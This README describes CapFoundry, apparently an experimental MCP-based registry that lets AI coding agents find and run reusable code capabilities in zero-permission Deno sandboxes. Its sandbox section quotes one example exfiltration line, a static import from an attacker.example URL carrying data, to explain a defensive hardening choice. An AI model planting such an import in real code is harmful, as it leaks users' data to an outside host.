# CapFoundry

> **Don't generate what you already know.**

CapFoundry is an experimental, demand-driven software capability platform for humans and AI agents.

Before an AI agent solves a software task, it can ask its local **CapFoundry Capabilities Manager (CFCM)**:

> **Can CapFoundry already do this?**

If a suitable capability exists, CFCM resolves its artifact and normally executes it locally. If no suitable capability exists, the agent solves the problem normally and can then consider whether the new solution should become a CapFoundry capability.

The architectural shorthand is:

> **Centralize knowledge. Decentralize execution.**

## Current status

CapFoundry is in **early implementation**. Phases 0–2 of the [implementation PRD](PRD.md) are done:
CFCM runs as a local MCP server that searches a compact index, resolves and verifies artifacts,
executes them in zero-permission Deno subprocesses, and writes local telemetry.

Nine capabilities now share **one search space** — seven public, one private, one machine-local —
with different policies per namespace. Measured on that index: search finds the right capability
for 16 of 17 rephrasings that never mention its name, and none of 19 near-miss or out-of-domain
queries produce a confident match. Overhead is ~40 ms p95 against a 250 ms budget.

Still ahead: candidate submission, the Capability Awareness Skill, the A/B evaluation harness that
decides whether any of this pays for itself, and Explore.

## Quick start

Requires [Deno](https://deno.com) 2.x.

```bash
deno task ci        # everything CI runs: fmt, lint, types, CFP validation, index sync, tests
deno task test      # just the suite: search, sandbox escapes, cache integrity, telemetry redaction
deno task prepare   # after editing a capability: fmt, re-seal artifact hashes, rebuild the index
```

`prepare` exists because the order matters: formatting changes an artifact's bytes, which
invalidates its `sha256`, which invalidates the index. CI checks both ends independently, so a
forgotten `seal` fails the build rather than shipping an unverified artifact.

Point CFCM at this repository as its registry and register it with a coding agent:

```bash
cp cfcm.example.json cfcm.json          # set "registry" to "." to use this checkout
deno task cfcm:mcp                      # speaks MCP over stdio
```

In Claude Code, register the server once:

```bash
claude mcp add cfcm -- deno run --allow-read --allow-write --allow-net --allow-run --allow-env \
  /absolute/path/to/CapFoundry/cfcm/mcp/server.ts
```

The agent then gets three tools — `cfcm_search`, `cfcm_invoke` and `cfcm_describe`. A confident
search that is given input runs the capability in the same call, so the common case costs one
round trip. (`cfcm_submit_candidate` arrives with Phase 3.)

### Namespaces

| Namespace | Source | Policy |
|---|---|---|
| `CapFoundry.*` | the static Git registry | public; artifacts returnable |
| `Netsi.*` (example) | a `filesystem` source in `cfcm.json` | private; `exposure.artifact: false`, so it executes but never hands back source |
| `Local.*` | built in, `~/.cfcm/local` | this machine only; never published, and CFCM refuses to let `Local` be declared as an external namespace |

All three are searched as one space. Only the policies differ.

### A note on the sandbox

Capability artifacts execute in their own Deno subprocess with **no `--allow-*` flag at all**, plus
`--no-remote`, `--no-npm` and a cleared environment. Zero permissions on its own is not enough:
Deno does not gate remote module loading behind `--allow-net`, so a static
`import "https://attacker.example/?data=..."` inside an artifact would be fetched before any
permission check ran. See SEC-10 in the [PRD](PRD.md) and the escape tests in
`tests/sandbox_test.ts`.

## Documentation

The current documents are:

- **[Vision & Architecture v0.5](docs/vision/CapFoundry-Vision-Architecture-v0.5.md)** — the broader product model, architectural principles, CFCM, namespaces, governance, security, discovery, telemetry and future direction.
- **[MVP v0.2](docs/mvp/CapFoundry-MVP-v0.2.md)** — the deliberately smaller first implementation and the experiments needed to prove or falsify the core idea.
- **[Implementation PRD v1.0](PRD.md)** — the buildable plan derived from MVP v0.2: architecture decisions, features with acceptance criteria, explicit data model, and phased delivery.

The Vision document describes where CapFoundry may go. The MVP document describes what should actually be built first. The PRD describes how to build it.

## Capabilities

All seven are implemented, each a complete CFP with tests, provenance and licence.

| Capability | What it does |
|---|---|
| `CapFoundry.text.slugify` | Locale-aware URL- and filename-safe slugs |
| `CapFoundry.date.businessDaysBetween` | Working days, with configurable weekends and caller-supplied holidays |
| `CapFoundry.geo.distance` | Great-circle distance between two WGS-84 points |
| `CapFoundry.validation.iban` | ISO 13616 length, charset and mod-97 checks with machine-readable reasons |
| `CapFoundry.csv.detectDelimiter` | Infers the field separator and returns its evidence |
| `CapFoundry.json.schema.infer` | Deterministic JSON Schema inference — the benchmark against direct generation |
| `CapFoundry.ui.dataTable` | Generates an accessible, framework-free sortable table Custom Element |

Two of them test different parts of the model rather than being useful in themselves.
`json.schema.infer` is the larger deterministic benchmark (MVP §37): it exists to be compared
against asking a model to do the same job, which is only meaningful because its inference rules are
written down. `ui.dataTable` returns **code you paste into a project** rather than a computed
value, testing artifact delivery.

## Capability packages

A complete namespaced capability is conceptually distributed as a **CFP — CapFoundry Package**. A CFP is expected to contain the capability contract, artifact, tests, provenance, license information and execution/permission metadata.

A future Capability Packager Skill should be able to inspect existing code, other capabilities, packages or a GitHub repository, discuss possible capability boundaries with the user, and produce a complete namespaced CFP. This includes appropriately licensed open-source code, for example MIT-licensed projects, while preserving license and provenance information.

## Ownership

CapFoundry is owned and developed by **Netsi**.

GitHub: **[@netsi1964](https://github.com/netsi1964)**  
X: **[@netsi1964](https://x.com/netsi1964)**

## License

CapFoundry is licensed under the **Apache License 2.0**. See [LICENSE](LICENSE).

Individual capability artifacts and CFP packages may use their own compatible licenses. Their license and provenance must be explicit rather than implicitly inherited from the CapFoundry platform.
